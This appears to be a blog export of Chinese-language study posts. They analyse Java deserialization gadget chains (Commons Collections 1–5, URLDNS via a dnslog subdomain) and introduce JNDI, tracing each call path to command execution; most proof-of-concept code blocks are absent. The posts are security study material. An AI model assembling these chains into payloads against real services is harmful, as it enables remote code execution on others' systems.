跟进，map是LazyMap，调用了get方法；[10] 来到get()，进入if，调用了transform；[11] 跟进，这里的iTransformers是我们传入的fakeTransformers，里面是notepad.exe命令；[12] 命令执行；[13] 可以看一下这时的调用栈；[14] 当然在这里执行命令不算咯，得在反序列化时执行才有用，这里也可以不使用InvokerTransformer，只是为了更清楚的表达这里也会调用LazyMap#get，触发RCE； 继续分析，这里已经调用过一次LazyMap#get了，为了后面反序列化时，能进入get()的if判断，所以调用remove()将key值删除掉；[15] 代码4 通过反射获取ChainedTransformer的iTransformers变量，将含有我们反序列化时要执行的命令的transformers数组传进去，替换前面的fakeTransformers； 完整POC： POC调试从HashMap#readObject开始，调用了put；[16] 调用链和add()差不多，直接跟到InvokerTransformer；[17] 命令执行成功；[18]"},{"title":"Java  Commons Collection 5分析","date":"2022-09-19T11:31:50.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%205%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC5和CC1的相似度很高，分析过CC1就很容易看懂CC5了。 可参考：Java Commons Collection 1分析 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 ysoserial中提示到这只适用于JDK 8u76，并且没有安全管理器；[1] 前置知识CC5中涉及到两个新的类，这里先介绍一下： TiedMapEntry[2] 该类有两个参数，一个Map类型，一个Object类型；后面我们会使用到它的getValue和toString方法。 BadAttributeValueExpException[3] 该类只有一个val参数。 POC分析 代码1 这一部分和CC1中LazyMap链一样，只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，然后执行命令。 代码2 TiedMapEntry.getValue()调用了get()，参数map是可控的；[4] 所以实例化TiedMapEntry类，将outerMap传进去，第二个参数可以随便填，用来占位； 接着，toString()方法又调用了getValue()方法；[5] 继续找哪里调用了toString()方法；BadAttributeValueExpException.readObject()调用了toString()方法；[6] valObj是从gf中的val参数获取的，而gf又是从反序列化流中读取的；所以，相当于控制了val参数，就控制了valObj，这里就通过反射给val赋为TiedMapEntry类的实例化对象；即调用了TiedMapEntry.toString()，这样就满足了命令执行需要的所以条件。 POC调试从BadAttributeValueExpException,readObject()跟起，valObj就获取到TiedMapEntry类的对象；[7] 跟进toString；[8] 跟进getValue；[9] 跟进get，这里出现了一点问题，map中包含了一个key为123，所以if判断为假，并没有进如if；[10] 按道理是该进入if的，我又尝试了几次；只在这个if这里断点，前面的断点都取消掉，那么map就没有key，可以进入if；[11] 不知道这是什么原因，猜测是跟IDEA的调试机制有关吧； 继续，就跟到了ChainedTransformer.transform()，这里就对tranaforms数组进行循环回调；[12] 循环到第三次InvokerTransformer.transform()；[13] return后，成功执行命令；[14]"},{"title":"Java  Commons Collection 4分析","date":"2022-09-19T11:30:59.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%204%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC4相当于是CC2和CC3的结合，只要熟悉前面几条链了，这条链也就很容易看懂了；CC4和CC2一样是通过调用TransformingComparator.compare()来实现transform()的调用；和CC3一样是通过实例化TrAXFilter类，然后调用它的构造方法，进而实现newTransformer()的调用； 可参考：Java Commons Collection 2分析Java Commons Collection 3分析 环境搭建 JDK 1.7 commons-collections 4.0 javassist pom.xml中添加： 利用链 POC分析 代码1使用javassit创建一个类，这个类中包含static代码块，其中包含恶意命令执行代码，只要实例化这个类，就会执行static中的代码；最后把该类转换为字节码存到targetByteCodes数组中； 代码2实例化一个 TemplatesImpl类对象，给一些参数赋值，赋值原因CC2中说明了原因； 代码3将TrAXFilter.class传给ConstantTransformer，那么就会返回TrAXFilter类，然后传给InstantiateTransformer，在InstantiateTransformer类中就会实例化TrAXFilter类，然而调用它的构造方法，进而调用newTransformer()方法，从而实现命令执行； [1][2] 代码4实例化一个TransformingComparator对象，将transformer传进去；实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null； 代码5新建一个对象数组，第一个元素为templates，第二个元素为1；然后通过反射将该数组传到queue中； 代码6通过反射将queue的size设为2，因为在PriorityQueue.heapify()中，size的值需要大于1才能进入下一步；（CC2中有说到） [3]代码7通过反射给queue的comparator参数赋值，从而调用到compare()方法，实现transform()的调用； POC调试还是从PriorityQueue.readObject()开始；queue[]里面是我们传入的TemplatesImpl类的实例化对象和整数1；[4] 跟进heapify()，size值为2；[5] 跟进siftDown，comparator参数不为null；[6] 跟进siftDownUsingComparator，调用了compare()；[7] 跟进compare()，obj1就是传入的templates，this.transformer是ChainedTransformer的实例化对象，也就是调用了ChainedTransformer.transform()；[8] 跟进ChainedTransformer.transform()，进入循坏；第一轮iTransformer参数值为ConstantTransformer，即调用了ConstantTransformer.transform()；[9] 跟进ConstantTransformer.transform()，iConstant参数值为传入的TrAXFilter.class，即返回了TrAXFilter类[10] 回到ConstantTransformer.transform()进入第二轮循环，这次的iTransformer参数值为InstantiateTransformer，object参数值为TrAXFilter；[11] 跟进InstantiateTransformer.transform()，返回TrAXFilter类对象；[12] 在实例化TrAXFilter类时，调用了它的构造方法，其中调用了templates.newTransformer()；[13] 后面就和CC2一样啦，到这里实例化了javassit新建类；[14] 命令执行成功；[15]"},{"title":"Java  Commons Collection 3分析","date":"2022-09-19T11:30:58.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%203%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC3相当于CC1和CC2的结合，仔细分析过CC1和CC2来看CC3就非常简单。 可参考：Java Commons Collection 1分析Java Commons Collection 2分析 环境搭建 JDK 1.7 Commons Collections 3.1 javassist pom.xml中添加： 利用链 前置知识CC3中会用到两个新的类，这里先介绍一下： TrAXFilter[1] 在该类的构造方法中，调用了传入参数的newTransformer()方法，看到这个方法有点熟悉了，可以实现命令执行，并且参数可控；CC2中，就是在InvokerTransformer.transform()中通过反射调用TemplatesImpl.newTransformer()方法，而CC3中，就可以直接使用TrAXFilter来调用newTransformer()方法。 InstantiateTransformer该类实现了Transformer、Serializable接口；[2] 在它的transform()方法中，判断了input参数是否为Class，若是Class，则通过反射实例化一个对象并返回；[3] POC分析 前面基本是CC2的内容；代码1 使用javassit创建一个类，这个类中包含static代码块，其中包含命令执行代码，只要实例化这个类，就会执行static中的代码；最后把该类转换为字节码存到targetByteCodes数组中； 代码2 实例化一个 TemplatesImpl类对象，给一些参数赋值，赋值原因CC2中说明了原因； 代码3 这里有一些不一样，将TrAXFilter.class传给ConstantTransformer，那么就会返回TrAXFilter类，然后传给InstantiateTransformer，在InstantiateTransformer类中就会实例化TrAXFilter类，然而调用它的构造方法，进而调用newTransformer()方法，从而实现命令执行；然后就是要找到调用ChainedTransformer.transform()的地方，才能对transformers 数组进行回调； 接下来就是CC1的内容了；代码4 new了一个LazyMap的对象，LazyMap的get()方法调用了transform()方法，factory参数就是传入的transformerChain，达到了代码3的条件；[4] 接着就是要找一个调用get()的地方，代码5 还是P牛那句话： 我们如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 AnnotationInvocationHandler是调用处理器，outerMap是被代理的对象，只要调用了LazyMap中的任意方法，就会触发AnnotationInvocationHandler中的invoke方法； 而在readObject方法中调用了entrySet()方法，所以触发invoke；[5] 在invoke方法中就调用了get方法；[6] 这样就基本上达到了执行命令所需要的条件。 调试看看；this.memberValues参数值为LazyMap，调用了它的entrySet方法，触发到invoke方法；[7] 跟进get方法，factory参数为ChainedTransformer的实例化对象，这里调用了它的transform方法；[8] 跟进到ChainedTransformer.transform()，对transformers[]数组进行循环；[9] 第一轮循环，iTransformers[0]参数值为ConstantTransformer，进入它的transform方法，返回TrAXFilter类；[10] 第二轮循坏，iTransformers[1]参数值为InstantiateTransformer，TrAXFilter作为参数传入transform方法；[11] 跟进它的transform方法，input参数值为TrAXFilter，iParamTypes参数值为Templates，iArgs参数值为TemplatesImpl的实例化对象templates，return了TrAXFilter类对象；[12] 在getConstructor(iParamTypes)获取它参数为Templates类的构造方法时，调用了TransformerImpl的newTransformer()；[13] 跟进newTransformer()，调用了getTransletInstance()方法；[14] 跟进，_name参数值为我们传入的blckder02，进入第二个if，_class参数值为null，_bytecodes参数值为用javassit创建的类的字节码；最后实例化_class[_transletIndex]，该参数的值就为EvilCat606069074499600[15] 执行static中的代码；[16] 命令执行成功；[17]"},{"title":"Java  Commons Collection 2分析","date":"2022-09-19T11:30:57.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%202%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建CC2使用的是javassist和PriorityQueue来构造利用链；并且使用的是commons-collections-4.0版本，该版本删除了lazyMap的decode方法，所以CC1不用4.0版本；而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本。 在pom.xml中添加： 利用链 利用链1分析跟着利用链，首先看看PriorityQueue.readObject()[1] 这里的queue[i]是从readObject得到的，再看看writeObject；[2] writeObject中依次将queue[i]进行序列化，那么我们通过反射实例化PriorityQueue类的对象，给queue[i]赋值，就实现了对queue[i]的控制。 最后调用了heapify方法，跟进：[3] 当i&gt;=0时进入for循环，而i=(size &gt;&gt;&gt; 1) -1将size进行了右移操作，所以size&gt;1才能进入循环。 再跟进siftDown方法：[4] x就是queue[i]，跟进siftDownUsingComparator方法：[5] 重点在comparator.compare(x, (E) c)；跟进可以看到Comparator是一个接口，compare是它的抽象方法；[6] CC2利用链中TransformingComparator类实现了compare方法；[7] 该方法中调用了this.transformer.transform()方法，看到这里，就有点熟悉了，this.transformer又是我们可控的，后面的理解和CC1差不多了。 POC1分析 代码1通过反射获取Runtime对象； 代码2当调用ChainedTransformer的transformer方法时，对transformers数组进行回调，从而执行命令；将transformerChain传入TransformingComparator，从而调用transformer方法；new一个PriorityQueue对象，传入一个整数参数，且传入的数值不能小于1，再将Tcomparator传入。 代码3前面说到，size的值要大于1，所以向queue中添加两个元素。 添加上序列化和反序列化代码后，能成功执行命令，但是没有生成序列化文件，也就是没有cc2.txt。 调试代码看一看，跟进PriorityQueue类，这里comparator参数是我们传入的Tcomparator；[8] 继续跟，跟进queue.add(2)，调用了offer方法；[9] 跟进offer方法，进入else分支，调用了siftUp方法；[10] 跟进siftUp方法，comparator参数不为null，进入if分支，调用siftUpUsingComparator方法；[11] 继续跟，来到重点代码；[12] 跟进，这里会执行两次命令；[13] 但是return的值为0，程序就结束了，并没有执行POC后面序列化和反序列化的代码。 那么如何让return不为0呢。既然调用siftUpUsingComparator方法会出错，那试试调用siftUpComparable方法，即comparator参数为null，修改代码，不传入comparator参数。 再调试看看；这下comparator参数就为null；[14] 照样进入queue.add(2)，到siftUp方法，就进入else分支，调用siftUpComparable方法；[15] 这样就只是单纯给queue[1]赋值，并不会调用compare方法；[16] 返回后就执行序列化代码，但是并没有执行命令，还要改进； 代码4上面修改后的代码没有调用到compare方法，我们可以在向queue中添加元素后，通过反射将Tcomparator传入到queue的comparator参数； 这样comparator参数就不为null，当反序列化时调用readObject方法时就会进入siftDownUsingComparator方法，调用compare方法，从而执行命令。[17] 完整POC Javassit补充简述：Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。 下面大概讲一下POC中会用到的类和方法： ClassPoolClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。 常用方法： static ClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPath insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置； ClassPath appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass：根据类名创建新的CtClass对象； CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用； CtClassCtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。 常用方法： void setSuperclass(CtClass clazz)：更改超类，除非此对象表示接口； byte[] toBytecode()：将该类转换为类文件； CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）； 示例代码 新生成的类是这样子的，其中有一块static代码；[17-1] 当该类被实例化的时候，就会执行static里面的语句；[17-2] 利用链2分析在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassit； 先给出POC： 代码1通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为newTransformer； 代码2实例化一个TransformingComparator对象，将transformer传进去；实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null； 代码3这里就要用到javassit的知识； 这段代码会新建一个类，并添加了一个static代码块；[17-3] 代码4使用TemplatesImpl的空参构造方法实例化一个对象；再通过反射对个字段进行赋值，为什么要这样赋值下面再说； 代码5新建一个对象数组，第一个元素为templates，第二个元素为1；然后通过反射将该数组传到queue中； 代码6通过反射将queue的size设为2，与POC1中使用两个add的意思一样； 代码6通过反射给queue的comparator参数赋值； 从PriorityQueue.readObject()方法看起，queue变量就是我们传入的templates和1，size也是我们传入的2；[18] 跟进siftDown方法，comparator参数就是我们传入的TransformingComparator实例化的对象；[19] 到TransformingComparator的compare方法，obj1就是我们传入的templates， 这里的this.transformer就是我们传入的transformer；[20] 跟到InvokerTransformer.transform()，input就是前面的obj1，this.iMethodName的值为传入的newTransformer，因为newTransformer方法中调用到了getTransletInstance方法；[21] 接着调用templates的newTransformer方法，而templates是TemplatesImpl类的实例化对象，也就是调用了TemplatesImpl.newTransformer()；跟踪该方法；[22] 继续跟踪getTransletInstance方法；进行if判断，_name不为空，_class为空，才能进入defineTransletClasses方法；这就是代码4中赋值的原因；[23] 跟进defineTransletClasses方法；[24] _bytecodes也不能为null，是我们传入的targetByteCodes，也就是代码3的内容，转换成字节数组是一串这样子的；[25] 继续往下；[26] 通过loader.defineClass将字节数组还原为Class对象，_class[0]就是javassit新建的类EvilCat1153850011981000；[26-1] 再获取它的父类，检测父类是否为ABSTRACT_TRANSLET，所以代码3中要设置AbstractTranslet类为新建类的父类； 给_transletIndex赋值为0后，返回到getTransletInstance方法，创建_class[_transletIndex]的对象，即创建EvilCat1153850011981000类的对象，那么该类中的static代码部分就会执行，成功执行命令；[27] 小结利用链1利用链1相对来说比较简单，只要控制好comparator什么时候为null，什么时候有值，就可以成功生成序列化文件和执行命令； 通过反射获取Runtime对象（得到transformers数组） 利用ChainedTransformer对transformers数组进行回调 调用TransformingComparator.compare触发transformer方法 this.transformer参数可控，传入恶意内容 利用链2利用链2用到了javassit，简单来说就是利用javassit的特点，可以新建一个类，并且可以向该类中插入恶意代码，由static修饰，当别处实例化这个类的时候就会执行static中的恶意代码； 所以整条链都是为了满足能成功实例化新建类而添加的条件；AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance() 参考连接："},{"title":"Java  Commons Collection 1分析","date":"2022-09-19T11:30:56.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%201%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言Java集合框架是JDK1.2中的一个重要补充。它添加了许多功能强大的数据结构，加快了最重要的Java应用程序的开发。从那时起，它已成为Java中公认的集合处理标准。Commons集合试图通过提供新的接口、实现和实用程序来构建JDK类。 Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 ysoerial中CommonsCollection1源码如下： 利用链： 环境搭建创建一个Maven项目，不用选择任何Maven模板；在pom.xml中添加如下代码： 刷新一下，成功导入commons-collections-3.1。[1] JDK1.7 相关类和接口TransformedMapTransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。 ChainedTransformerChainedTransformer是实现了Transformer、Serializable接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起，将前一个回调返回的结果作为后一个的参数传入。 TransformerTransformer是一个接口，只有一个带实现的方法；TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个“回调函数”，这个回调的参数是原始对象。 ConstantTransformerConstantTransformer是实现了Transformer、Serializable接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回； 作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作。 InvokerTransformerInvokerTransformer是实现了Transformer、Serializable接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键； 在实例化这个InvokerTransformer时，需要传⼊三个参数： 第⼀个参数是待执⾏的⽅法名 第⼆个参数是这个函数的参数列表的参数类型 第三个参数是传给这个函数的参数列表 后面transform方法，通过反射调用执行了input对象的iMethodName方法。 TransformedMap链Test1先构造一个简单的POC： Transformer是一个接口，ConstantTransformer和InvokerTransformer都是Transformer接口的实现类；这里并不是new了一个接口，而是new了一个Transformer类型的数组，里面存储的是 Transformer的实现类对象。 然后使用ChainedTransformer对transformers 数组进行一系列回调； 将创建的innerMap和transformerChain传入TransformedMap.decorate；最后要向Map中放入一个新元素，从而执行命令。[2] Test2上面的Test1并只是一个本地测试，而我们还需要将最终生成的outerMap对象变成一个序列化流；代码1Runtime类没有实现Serializable接⼝，不能被直接序列化；所以我们需要通过反射来获取Runtime对象； 代码2当调用ChainedTransformer的transformer方法时，会对transformers数组进行一系列回调： 将ConstantTransformer返回的Runtime.class传给第一个InvokerTransformer； 将第一个InvokerTransformer返回的(Runtime.class).getMethod(&quot;getRuntime&quot;,null)传给第二个InvokerTransformer； 将第二个InvokerTransformer返回的((Runtime.class).getMethod(&quot;getRuntime&quot;,null)).invoke(null,null)传给第三个InvokerTransformer； (((Runtime.class).getMethod(&quot;getRuntime&quot;,null)).invoke(null,null)).exec(&quot;calc&quot;)是第三个InvokerTransformer的返回值。 代码3用了TransformedMap修饰Map对象，decorate方法中又new了一个TransformedMap对象，transformerChain作为参数传进去； TransformedMap类中的注释说到Map的put方法和Map.Entry的setValue方法会受到该类的影响；[3] TransformedMap继承于AbstractInputCheckedMapDecorator类，而AbstractInputCheckedMapDecorator又继承于AbstractMapDecorator类，AbstractMapDecorator类继承于Map类； 跟到AbstractInputCheckedMapDecorator类的setValue方法；[4]最后其实是调用Map.setValue()； 跟进checkSetValue方法到TransformedMap类，注释中也提到调用setValue方法时自动调用checkSetValue方法；这里调用了valueTransformer的transform方法，而valueTransformer就是我们传入的transformerChain，transformerChain又是ChainedTransformer的实例化对象，也就是成功调用了ChainedTransformer的transformer方法，从而实现代码2对transformers数组进行回调。[5] 代码4通过反射获取AnnotationInvocationHandler类对象，获取构造方法，实例化一个对象handler； 看一下sun.reflect.annotation.AnnotationInvocationHandler类，它的构造函数中第一个参数是个Annotation类，第⼆个是参数就是前⾯构造的Map；[6] 这是一个内部类，需要通过反射来获取；在它的readObject方法中调用了setValue方法，也就是说反序列化时会调用setValue方法，进而实现上面几部分代码。 然而只有当if判断为真时才会进入分支执行setValue方法，也就是说var7不能为null；var7不为null需要满足以下两个条件： 第一个参数必须是Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设方法名为X 被TransformedMap.decorate修饰的Map中必须有⼀个键名为X的元素 而Retention恰好是Annotation类，含有⼀个value方法；[7] 所以这里是创建Retention.class的对象；然后，为了再满⾜第⼆个条件，需要给Map中放⼊⼀个键名为value的元素，所以在代码3中要给Map对象加一个键名为value的元素； 下面大概跟一下为什么键名要和方法名相同；在AnnotationInvocationHandler的readObject方法中，跟进 [8] var0就是我们传入的Retention，再跟进AnnotationType；[9] 第一处返回了Retention类中的所有方法到var2；第二处通过for循坏，获取方法名到var7；第三处将获取到的方法名put到memberTypes。 Retention类中就只有一个value方法，所以memberTypes的值就是value；再回到AnnotationInvocationHandler类，var3的值就是value； 接下来： 所以为了能var3中找到键名为value的值，需要给Map对象put一个键名为value的元素。 最后加上序列化和反序列化的代码，整理为如下POC： [10] 这个POC只有在Java 8u71以前的版本中才能执行成功，Java 8u71以后的版本由于sun.reflect.annotation.AnnotationInvocationHandler发⽣了变化导致不再可⽤；在ysoserial的代码中，没有⽤到上面POC的TransformedMap，而是改用了了LazyMap。 LazyMap链LazyMap也来自于Common-Collections库，并继承AbstractMapDecorator类。LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的factory.transform 。当在get找不到值的时候，它会调用factory.transform方法去获取一个值：[11] 代码1和代码2与TransformedMap链中的一样； 代码3 因为要满足map.containsKey(key) == false，就不需要向Map中添加元素；把transformerChain传进去，transformerChain是Transformer类型的；看一下LazyMap.decorate方法：[12] new了一个LazyMap对象；[13] get方法中的factory就是我们传入的transformerChain，也就是说，只要调用了get方法，并且Map对象中的没有key，就可以触发ChainedTransformer的transform方法，从而实现代码2对transformers数组进行回调，进而执行命令。 现在要找一个调用get方法的地方；在AnnotationInvocationHandler类的invoke方法中调用了get方法：[14] 那又要如何调用到invoke方法；P牛的文章中说到： 我们如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 Java动态代理知识可参考：Java 动态代理 代码4通过反射获取sun.reflect.annotation.AnnotationInvocationHandler对象，再对该对象进行Proxy； Proxy.newProxyInstance的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。 代理后的对象叫做proxyMap，但不能直接对其进行序列化，因为入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹： 最后添加上序列化和反序列化的代码整理为如下POC： 成功执行命令：[15] 参考连接：Java安全漫谈 - 09.反序列化篇(3)Java安全漫谈 - 10.反序列化篇(4)Java安全漫谈 - 11.反序列化篇(5) 疑问[16] 最后LazyMapd POC直接执行没有计数器弹出，经调试发现，计算器在上图第一处就弹出，有时不止弹出一次；问题解决，以上两个POC都可在1.7版本下执行命令。 程序运行到上图第二处时就结束，未执行后续代码。"},{"title":"Java URLDNS链分析","date":"2022-09-19T11:30:55.000Z","url":"/2022/09/19/Java%20URLDNS%E9%93%BE%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言ysoserialysoserial是学习反序列化漏洞的一个重要工具，它集合了多种反序列化漏洞的payload，可以让用户根据自己选择的利用链，生成反序列化利用数据，通过讲这些数据发送给目标，从而执行用户预先定义的命令。下载地址：ysoserial 什么是利用链利用链也叫“gadget chains”，通常称为gadget。可以类比PHP反序列化，将gadget理解为一种方法，它连接的是从触发位置开始到执行命令位置结束，类似PHP中从__destruct到eval。 使用ysoserial可以容易的生成gadget对应的POC，例如： ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是id；⽣成好的POC发送给⽬标，如果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令id将被执⾏。 URLDNSURLDNS是ysoserial中一个利用链的名字，但准确来说，不能称作利用链。因为其参数不是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一个DNS请求。 URLDNS有如下优点，适合在检测反序列化漏洞是使用： 使用Java内置的类构造，不依赖第三方库 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 不限JDK版本 将下载的ysoserial用Intellij IDEA打开，进入ysoserial/src/main/java/ysoserial/payloads/URLDNS.java即可看到ysoserial中URLDNS的源码： 注释中给出了利用链： 利用链分析HashMap.java#readObject触发反序列化的方法一般就是readObject() 最后一行代码将key使用hash函数进行了处理； 跟进hash()函数； 这里的key是java.net.URL对象，值是传入的url，不为null，进入hashCode方法；URL.java#hashCode hashCode值等于-1时会进行handler.hashCode(this)计算；这里hanlder是URLStreamHandler对象（的某个⼦类对象），继续跟进hashCode方法；URLStreamHandler.java#hashCode 跟进getProtocol方法，是用来获取传入URL的协议名称； 再看getHostAddress方法；URLStreamHandler.java#getHostAddress InetAddress.getByName(host)是根据主机名获取其IP地址，这时候就会触发一次DNS请求。 漏洞测试在上获取一个子域名z57gpb.dnslog.cn作为url传入；[1]反序列化类： 测试类： URL类中hashCode成员变量是私有的，要加setAccessible(true)才能访问；[2] 先运行测试类，生成demo.txt文件，在运行反序列化类，成功触发DNS请求；[3] 小结利用链可归结为： HashMap-&gt;readObject() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() java.util.HashMap 重写了readObject方法，在反序列化时会调用hash函数计算key的 hashCode，而java.net.URL的hashCode在计算时会调用getHostAddress来解析域名，从而发出DNS请求. 参考连接：安全漫谈 - 08.反序列化篇(2) 疑问： 测试代码是如何跟URLDNS联系的，如何发送DNS请求 DNS请求是在序列化时触发还是反序列化时触发，怎么触发的（经测试是在反序列化时触发的） "},{"title":"Java JNDI","date":"2022-09-19T11:29:30.000Z","url":"/2022/09/19/Java%20JNDI/","categories":[[" ",""]],"content":"概述JNDI全称是Java命名和目录接口（Java Naming and Directory Interface），是Java中为命名和目录服务提供接口的API。 JNDI由Naming(命名)和Directory(目录)组成： 命名NamingNaming是指将对象通过唯一标识符(取个名字)绑定到一个容器环境Context中，以后又可以使用lookup方法从环境容器中根据这个唯一标识符找到所绑定的Java对象。 在真实的项目应用中，通常是由系统程序或框架程序先将资源对象绑定到JNDI环境中，以后在该系统或框架中运行的模块程序就可以从JNDI环境中查找这些资源对象进行使用，而不用关心数据源(DataSource)对象是如何创建出来的，这种方式极大的增强了系统的可维护性。 容器环境(Context) 本身也是一个Java对象，他可以通过一个名称绑定到另一个容器环境中。将一个Context对象绑定到另一个Context对象中，这就形成了一种父子级联关系，多个Context对象最终可以级联成一种树状结构，树中的每个Context对象中都可以绑定若干个Java对象。 [1] 上图中，每个方框都代表一个Context对象，名称分别为a、b、c、d，其中存在父子级关系；椭圆1、2、3、4、5、6、7则是绑定在容器环境中的Java对象，在同一个Context不能绑定两个相同名称的Java对象，在不同的Context中可以出现同名的Java对象。 调用Context对象的lookup方法可以获取其中绑定的Java对象，也可以获取其所在Context树状结构中的任意一个Context对象，包括它的父级和子级，只需要在lookup方法中指定相应的Context路径即可。 要执行JNDI命名操作，必须获取一个作为操作入口的Context对象，在JNDI API中，提供了InitialContext类来创建Context对象。InitialContext类实现了Context接口，上面所说的Context对象其实是Context接口的某个实现类中的实例对象。 目录DirectoryJNDI中的目录与文件目录不同，JNDI中的目录是指将一个对象的所有属性信息保存到一个容器环境中，与JNDI的命名原理相似，只不过目录容器环境中保存的是对象的属性，而不是对象本身，所以JNDI的目录提供的是对属性的各种操作。 JNDI API中提供了DirContext接口来完成目录相关操作，该接口继承了Context接口，名称(Name)可以作为参数传给DirContext，所以它也能完成命名的相关操作。 [2] 上图中，每个方框都代表一个DirContext对象，名称分别为a、b，b是a的子DirContext椭圆dog、cat则是绑定在目录容器环境中的Java对象；圆角矩形代表某个对象的属性。一个DirContext容器环境中既可以绑定java对象本身，也可以绑定对象的属性，尽管它们的名字相同，但是对它们的操作是独立的；并且一个属性可以拥有多个属性值。 同样，要执行JNDI命名与目录属性操作，必须获取一个作为操作入口的DirContext对象，JNDI API中提供了一个InitialDirContext类来创建DirContext对象。 下面再具体介绍相关类的使用。 JNDI 相关APIJava JDK中提供了java.naming模块，其中包含5个包： javax.naming：提供用于访问命名服务的类和接口 javax.naming.directory：扩展 javax.naming程序包以提供访问目录服务的功能 javax.naming.event：在访问命名和目录服务时为事件通知提供支持 javax.naming.ldap：提供对LDAPv3扩展操作和控件的支持 javax.naming.spi：提供通过 javax.naming和相关软件包动态插入支持访问命名和目录服务的 javax.naming Class InitialContext实现了Context接口，已知直接子类有InitialDirContext；构造方法： InitialContext()：构造一个初始上下文 InitialContext(boolean lazy)：构造一个初始上下文，可以选择不初始化它 InitialContext(Hashtable&lt;?, ?&gt; environment)：使用提供的环境构造初始上下文。 常用方法： bind(Name name, Object obj)：将名称绑定到对象 list(String name)：枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名 lookup(String name)：检索命名对象 rebind(String name, Object obj)：将名称绑定到对象，覆盖任何现有绑定 unbind(String name)：取消绑定命名对象 示例代码： Class Reference实现了Serializable 、Cloneable接口，已知直接子类有LinkRef；此类表示对在命名&#x2F;目录系统外部找到的对象的引用；Reference提供了一种记录有关对象的地址信息的方法，这些对象本身并不直接绑定到命名&#x2F;目录系统。 构造方法： Reference(String className)：为类名为“className”的对象构造一个新引用 Reference(String className, String factory, String factoryLocation)：构造具有类名“className”的对象的新引用，以及对象工厂的类名和位置 Reference(String className, RefAddr addr)：为类名为“className”的对象和地址构造一个新引用 Reference(String className, RefAddr addr, String factory, String factoryLocation)：构造具有类名“className”的对象的新引用，对象工厂的类名和位置以及对象的地址 常用方法： void add(int posn, RefAddr addr)：将地址添加到索引posn的地址列表中 void add(RefAddr addr)：将地址添加到地址列表的末尾 void clear()：从此引用中删除所有地址 RefAddr get(int posn)：检索索引posn上的地址 RefAddr get(String addrType)：检索地址类型为“addrType”的第一个地址 Enumeration&lt;RefAddr&gt; getAll()：检索本参考文献中地址的列举 String getClassName()：检索引用引用的对象的类名 String getFactoryClassLocation()：检索此引用引用的对象的工厂位置 String getFactoryClassName()：检索此引用引用对象的工厂的类名 Object remove(int posn)：从地址列表中删除索引posn上的地址 int size()：检索此引用中的地址数 String toString()：生成此引用的字符串表示形式 示例代码： 这里将reference传入了ReferenceWrapper类，因为在RMI中说到过，远程接口要继承java.rmi.Remote接口，表明这个接口可以被远程调用；而远程接口实现类还必须继承java.rmi.server.UnicastRemoteObject。可参考：Java RMI 